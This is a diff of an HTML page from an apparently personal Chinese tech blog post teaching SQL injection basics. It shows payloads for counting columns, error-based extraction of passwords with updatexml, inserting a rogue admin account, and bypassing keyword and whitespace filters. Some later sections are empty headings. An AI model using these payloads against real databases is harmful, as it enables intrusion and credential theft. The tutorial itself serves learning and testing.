@@ -19,15 +19,15 @@
   <meta name="author" content="ziddzide">
   <meta name="keywords" content="">
   
-    <meta name="description" content="SQL注入–基础篇 SQL注入基础对用户参数过滤不严格导致输入数据可以影响预设查询功能的导致数据库被入侵的一种技术 SQL注入技巧 判断列数:order by 5 --+  闭合符号的判断数字型注入id&#x3D;1 and 1&#x3D;2   判断是否是数字型,如果通过无闭合符号 字符型注入 1&#39; and &#39;1&#39;&#x3D;&#39;1  ，1&#39; and &#39;1&#39;&#x3D;&#39;2">
+    <meta name="description" content="SQL注入 SQL注入基础对用户参数过滤不严格导致输入数据可以影响预设查询功能的导致数据库被入侵的一种技术 SQL注入技巧 判断列数:order by 5 --+  闭合符号的判断数字型注入id&#x3D;1 and 1&#x3D;2   判断是否是数字型,如果通过无闭合符号 字符型注入 1&#39; and &#39;1&#39;&#x3D;&#39;1  ，1&#39; and &#39;1&#39;&#x3D;&#39;2  判断">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SQL注入--基础篇">
 <meta property="og:url" content="http://example.com/2025/09/13/SQL%E6%B3%A8%E5%85%A5-%E5%9F%BA%E7%A1%80%E7%AF%87/index.html">
 <meta property="og:site_name" content="ziddzide的技术博客">
-<meta property="og:description" content="SQL注入–基础篇 SQL注入基础对用户参数过滤不严格导致输入数据可以影响预设查询功能的导致数据库被入侵的一种技术 SQL注入技巧 判断列数:order by 5 --+  闭合符号的判断数字型注入id&#x3D;1 and 1&#x3D;2   判断是否是数字型,如果通过无闭合符号 字符型注入 1&#39; and &#39;1&#39;&#x3D;&#39;1  ，1&#39; and &#39;1&#39;&#x3D;&#39;2">
+<meta property="og:description" content="SQL注入 SQL注入基础对用户参数过滤不严格导致输入数据可以影响预设查询功能的导致数据库被入侵的一种技术 SQL注入技巧 判断列数:order by 5 --+  闭合符号的判断数字型注入id&#x3D;1 and 1&#x3D;2   判断是否是数字型,如果通过无闭合符号 字符型注入 1&#39; and &#39;1&#39;&#x3D;&#39;1  ，1&#39; and &#39;1&#39;&#x3D;&#39;2  判断">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2025-09-13T13:49:27.000Z">
-<meta property="article:modified_time" content="2025-09-13T14:49:17.112Z">
+<meta property="article:modified_time" content="2025-09-14T13:06:43.417Z">
 <meta property="article:author" content="ziddzide">
 <meta property="article:tag" content="SQL注入">
 <meta name="twitter:card" content="summary_large_image">
@@ -223,7 +223,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1k 字
+          1.4k 字
         
       </span>
     
@@ -234,7 +234,7 @@
         
         
         
-          9 分钟
+          12 分钟
         
       </span>
     
@@ -276,7 +276,7 @@
             
               <div class="markdown-body">
                 
-                <h1 id="SQL注入–基础篇"><a href="#SQL注入–基础篇" class="headerlink" title="SQL注入–基础篇"></a>SQL注入–基础篇</h1><hr>
+                <h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><hr>
 <h2 id="SQL注入基础"><a href="#SQL注入基础" class="headerlink" title="SQL注入基础"></a>SQL注入基础</h2><p>对用户参数过滤不严格导致输入数据可以影响预设查询功能的导致数据库被入侵的一种技术</p>
 <h3 id="SQL注入技巧"><a href="#SQL注入技巧" class="headerlink" title="SQL注入技巧"></a>SQL注入技巧</h3><ul>
 <li>判断列数:<code>order by 5 --+</code></li>
@@ -307,7 +307,6 @@
 
 
 
-
 <p><strong>附言</strong>:<code>limit1,1</code>限制查询手段,取查询结果中第一条数据之后的第一条数据</p>
 <h3 id="字符型注入和布尔盲注"><a href="#字符型注入和布尔盲注" class="headerlink" title="字符型注入和布尔盲注"></a>字符型注入和布尔盲注</h3><h4 id="字符型-判断手段"><a href="#字符型-判断手段" class="headerlink" title="字符型 判断手段"></a>字符型 判断手段</h4><p>在url中改变<code>id=3-1</code>无效,但是改变为<code>id=2a</code>有效时,SQL强制将<code>2a</code>转换为<code>2</code>,<code>a</code>被强制转换为<code>0</code></p>
 <h4 id="字符型-利用方式"><a href="#字符型-利用方式" class="headerlink" title="字符型 利用方式"></a>字符型 利用方式</h4><p>在url中用单引号闭合前面的单引号,再用#(<code>%23</code>或<code>--%20</code>)去注释掉后面的语句,但是所用格式应该要是url编码</p>
@@ -333,27 +332,41 @@
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id <span class="hljs-operator">=</span> <span class="hljs-number">1</span><span class="hljs-string">&#x27; or updatexml(1,concat(0x7e,(select pwd from wp_user)),1)%23</span><br></code></pre></td></tr></table></figure>
 
 <hr>
-<h2 id="SQL注入点"><a href="#SQL注入点" class="headerlink" title="SQL注入点"></a>SQL注入点</h2><ul>
-<li><p>select_expr:常用于页面展示,例如新闻内容</p>
-</li>
-<li><p>table_reference</p>
-</li>
-<li><p>注入点在limit之后</p>
-</li>
-<li><p>注入点在having或where之后</p>
-</li>
-<li><p>注入点在order by或者group by之后</p>
-</li>
-<li><p>注入点在tbl_name之后</p>
-</li>
-<li><p>注入点在values</p>
-</li>
-<li><p>UPDATE注入</p>
-</li>
-<li><p>DELETE注入</p>
-</li>
-</ul>
-<hr>
+<h2 id="SQL注入点"><a href="#SQL注入点" class="headerlink" title="SQL注入点"></a>SQL注入点</h2><h3 id="SELECT注入"><a href="#SELECT注入" class="headerlink" title="SELECT注入"></a>SELECT注入</h3><h4 id="注入点在select-expr"><a href="#注入点在select-expr" class="headerlink" title="注入点在select_expr"></a>注入点在select_expr</h4><p>可以使用时间盲注的方法,也可以用<code>as</code>别名的方式注入</p>
+<p>例如</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> pwd <span class="hljs-keyword">from</span> users) <span class="hljs-keyword">as</span> title<br></code></pre></td></tr></table></figure>
+
+<h4 id="注入点在table-reference"><a href="#注入点在table-reference" class="headerlink" title="注入点在table_reference"></a>注入点在table_reference</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">依然可以用<span class="hljs-keyword">as</span>别名的方式进行注入<br></code></pre></td></tr></table></figure>
+
+<h3 id="注入点在where或者having之后"><a href="#注入点在where或者having之后" class="headerlink" title="注入点在where或者having之后"></a>注入点在where或者having之后</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">判断有无引号包括使用基础注入手段,例如<span class="hljs-keyword">union</span>即可<br></code></pre></td></tr></table></figure>
+
+<h3 id="注入点在group-by或者order-by之后"><a href="#注入点在group-by或者order-by之后" class="headerlink" title="注入点在group by或者order by之后"></a>注入点在group by或者order by之后</h3><p>针对性测试,利用时间盲注手段也可.</p>
+<h3 id="注入点在limit之后"><a href="#注入点在limit之后" class="headerlink" title="注入点在limit之后"></a>注入点在limit之后</h3><p>略</p>
+<h3 id="insert注入"><a href="#insert注入" class="headerlink" title="insert注入"></a>insert注入</h3><h4 id="注入点位于tbl-name"><a href="#注入点位于tbl-name" class="headerlink" title="注入点位于tbl_name"></a>注入点位于tbl_name</h4><p>通过注释掉后面的语句尝试直接插入特定的数据</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">table</span><span class="hljs-operator">=</span>users <span class="hljs-keyword">values</span>(<span class="hljs-number">20</span>,<span class="hljs-string">&#x27;newadmin&#x27;</span>,<span class="hljs-string">&#x27;newpass&#x27;</span>)<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="注入点位于values"><a href="#注入点位于values" class="headerlink" title="注入点位于values"></a>注入点位于values</h4><p>例如下面这种情况</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">users <span class="hljs-keyword">values</span>(<span class="hljs-number">20</span>,<span class="hljs-string">&#x27;newadmin&#x27;</span>,<span class="hljs-string">&#x27;可控位置&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>往里面直接插入select语句即可,但查询结果必须是单个元素</p>
+<h3 id="update注入"><a href="#update注入" class="headerlink" title="update注入"></a>update注入</h3><p>可利用修改多个字段的数据</p>
+<h3 id="其他注入点"><a href="#其他注入点" class="headerlink" title="其他注入点"></a>其他注入点</h3><p>利用方式与select相似</p>
+<h2 id="注入绕过和防御手段"><a href="#注入绕过和防御手段" class="headerlink" title="注入绕过和防御手段"></a>注入绕过和防御手段</h2><h3 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h3><p>空格包括它的url码被替换成其他字符的情况</p>
+<p>原sql代码案例</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">$id<span class="hljs-operator">=</span>str_replace(&quot; &quot;,&quot;&quot;,$id);<br></code></pre></td></tr></table></figure>
+
+<p>此时能够代替空格的空白字符有:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs url">%0a<br>%0b<br>%0c<br>%0d<br>%09<br>%a0 (在特定字符集才可使用)<br>以及/**/和括号等<br></code></pre></td></tr></table></figure>
+
+<h3 id="select过滤"><a href="#select过滤" class="headerlink" title="select过滤"></a>select过滤</h3><p>将select字符转化为空的情况,可以使用双写绕过</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> selselectect<br></code></pre></td></tr></table></figure>
+
+<h3 id="大小写匹配"><a href="#大小写匹配" class="headerlink" title="大小写匹配"></a>大小写匹配</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">大小写混写绕过: <span class="hljs-keyword">seLeCt</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="正则匹配"><a href="#正则匹配" class="headerlink" title="正则匹配"></a>正则匹配</h3><p>正则匹配关键字<code>\bselect\b</code>可用形如<code>/*!50000select*/</code>的方式绕过</p>
+<h3 id="替换了单引号或双引号-忘记反斜杠"><a href="#替换了单引号或双引号-忘记反斜杠" class="headerlink" title="替换了单引号或双引号,忘记反斜杠"></a>替换了单引号或双引号,忘记反斜杠</h3><p>在第一个控制点输入<code>\</code>在第二个可控点输入<code>--+</code>,使第二个可控点逃狱</p>
+<h2 id="逃逸引号"><a href="#逃逸引号" class="headerlink" title="逃逸引号"></a>逃逸引号</h2><p>注入的重点在逃逸引号,如果开发者提前将所有字符转义,还有一些特殊情况可以完成注入</p>
+<h3 id="编码解码"><a href="#编码解码" class="headerlink" title="编码解码"></a>编码解码</h3><h3 id="特异注入点"><a href="#特异注入点" class="headerlink" title="特异注入点"></a>特异注入点</h3><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><h3 id="字符串截断"><a href="#字符串截断" class="headerlink" title="字符串截断"></a>字符串截断</h3><hr>
 <h2 id="附言"><a href="#附言" class="headerlink" title="附言"></a>附言</h2><h3 id="UNION注入需要注意的事项"><a href="#UNION注入需要注意的事项" class="headerlink" title="UNION注入需要注意的事项:"></a>UNION注入需要注意的事项:</h3><p>UNION联合注入需要保持列数一致性,也就是UNION SELECT 后面的值需要是子查询或其他的形式,如果是group_concat则是一个完整的查询语句,会有语法上的错误</p>
 <p>只有 ​<strong>返回单行单列值（标量）的表达式</strong>​ 才能作为 <code>UNION</code>的列值。常见形式包括：</p>
 <h4 id="​1-子查询（Subquery）​​"><a href="#​1-子查询（Subquery）​​" class="headerlink" title="​1. 子查询（Subquery）​​"></a>​1. 子查询（Subquery）​​</h4><pre><code class="hljs">SELECT 1, (SELECT group_concat(table_name) FROM ...), 3
